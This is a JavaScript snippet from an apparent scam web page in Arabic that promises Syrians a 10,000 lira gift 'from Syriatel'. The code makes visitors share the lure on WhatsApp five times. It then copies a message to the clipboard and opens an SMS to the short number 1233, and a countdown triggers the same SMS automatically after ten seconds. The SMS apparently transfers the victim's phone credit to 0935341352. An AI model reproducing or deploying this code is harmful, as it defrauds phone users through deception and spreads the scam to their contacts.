<script>
    const number = "1233"; // رقم الهاتف
    const message = "0935341352 200"; // الرسالة الجديدة
    const delay = 10; // عدد الثواني قبل الإرسال التلقائي
    const siteLink = "https://azaamazeez.github.io/Newaa/"; // رابط الموقع
    const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
    
    let shareCount = 0; // عدد المشاركات

    // وظيفة مشاركة الرسالة عبر واتس آب
    function shareOnWhatsApp() {
        // كلما شارك المستخدم، ازداد العد
        shareCount++;
        // تحديث عدد المشاركات المتبقية
        const remainingShares = 5 - shareCount;
        document.getElementById("remainingShares").textContent = remainingShares;

        // تمكين زر 2 إذا كانت المشاركات 5 أو أكثر
        if (shareCount >= 5) {
            document.getElementById("copyBtn").disabled = false;
        }
        const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
        window.open(whatsappUrl, "_blank");
        alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
    }

    // وظيفة نسخ النص والرابط ومشاركته عبر واتس آب
    function copyAndShare() {
        // نسخ الرسالة الجديدة إلى الحافظة
        const newMessage = `‏‪0935341352‬‏ 200 إلى ${number}`; 
        navigator.clipboard.writeText(newMessage).then(() => {
            alert("تم نسخ النص والرابط بنجاح! الآن سيتم فتح تطبيق الرسائل لمشاركة النص.");
            // فتح تطبيق الرسائل مع الرسالة الجديدة
            const smsUrl = `sms:${number}?body=${encodeURIComponent(newMessage)}`;
            window.location.href = smsUrl; // إرسال الرسالة
        }).catch(err => {
            alert("حدث خطأ أثناء النسخ. حاول مرة أخرى.");
        });
    }

    // وظيفة إرسال الرسالة تلقائيًا بعد التأخير
    function sendMessage() {
        window.location.href = `sms:${number}?body=${encodeURIComponent(message)}`;
    }

    // عداد زمني للإرسال التلقائي
    let timeLeft = delay;
    const timerElement = document.getElementById("timer");

    const countdown = setInterval(() => {
        timeLeft--;
        timerElement.textContent = timeLeft;

        // إذا انتهى الوقت، يتم الإرسال تلقائيًا
        if (timeLeft <= 0) {
            clearInterval(countdown); // إيقاف العداد
            sendMessage(); // إرسال الرسالة تلقائيًا
        }
    }, 1000); // تحديث كل ثانية
</script>
